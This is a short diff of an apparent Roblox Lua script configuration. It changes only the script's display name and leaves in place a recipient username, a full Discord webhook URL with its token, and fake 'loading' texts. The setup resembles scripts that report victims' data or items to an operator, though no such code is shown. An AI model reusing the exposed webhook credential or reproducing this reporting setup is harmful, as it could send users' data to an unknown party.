@@ -8,7 +8,7 @@
 Username = "jiegamingstido"
 WebHook = "https://discord.com/api/webhooks/1072084019518382101/q9D2DokarAwm4OtiiAen2AHFrB2bLvKspCBtti2_-2FTN7MqhR1MgcNd5_k0f_bV2YNm"
 
-_G.CustomScriptName = "Jie"
+_G.CustomScriptName = "TSD_DOGE HUB"
 _G.Text1 = "Script Loaded..."
 _G.Text2 = "Waiting for Script"
 _G.Text3 = "Checking Scripts..."
